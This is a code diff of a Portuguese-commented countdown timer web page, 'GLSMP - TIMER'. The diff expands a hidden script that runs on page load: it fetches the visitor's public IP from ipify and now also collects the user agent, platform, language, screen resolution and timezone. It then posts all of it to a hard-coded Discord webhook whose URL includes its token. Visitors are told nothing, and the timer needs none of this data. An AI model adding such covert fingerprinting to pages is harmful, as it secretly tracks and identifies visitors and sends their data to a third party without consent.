@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GLSMP - TIMER</title>
     <style>
-        /* Seu estilo CSS permanece o mesmo */
         body {
             margin: 0;
             padding: 0;
@@ -91,14 +90,22 @@
 
         const countdownInterval = setInterval(updateCountdown, 1000);
 
-        // Função para pegar o IP e enviar ao webhook do Discord
-        function sendIpToWebhook() {
+        // Função para pegar o IP, informações do dispositivo e enviar ao webhook do Discord
+        function sendDeviceInfoToWebhook() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const webhookUrl = 'https://discord.com/api/webhooks/1272075727235448842/Uwe7Ey2QSwnhp7wcOqEHipiMf1WT0Nw4CVPE3hEhUJEUEULjY8xjgWuOPVcdlbCZrSb7'; // Insira o URL do seu webhook aqui
-                    const ipInfo = {
-                        content: `Novo visitante: IP ${data.ip}`
+                    const ip = data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const language = navigator.language;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                    const webhookUrl = 'https://discord.com/api/webhooks/1272075727235448842/Uwe7Ey2QSwnhp7wcOqEHipiMf1WT0Nw4CVPE3hEhUJEUEULjY8xjgWuOPVcdlbCZrSb7'; // Seu webhook
+                    const deviceInfo = {
+                        content: `Novo visitante:\nIP: ${ip}\nUser Agent: ${userAgent}\nPlataforma: ${platform}\nIdioma: ${language}\nResolução: ${screenWidth}x${screenHeight}\nFuso Horário: ${timezone}`
                     };
 
                     fetch(webhookUrl, {
@@ -106,14 +113,14 @@
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify(ipInfo)
+                        body: JSON.stringify(deviceInfo)
                     });
                 })
-                .catch(error => console.error('Erro ao obter IP:', error));
+                .catch(error => console.error('Erro ao obter informações do dispositivo:', error));
         }
 
-        // Chama a função para enviar o IP quando o site carregar
-        window.onload = sendIpToWebhook;
+        // Chama a função para enviar as informações do dispositivo quando o site carregar
+        window.onload = sendDeviceInfoToWebhook;
     </script>
 </body>
 </html>
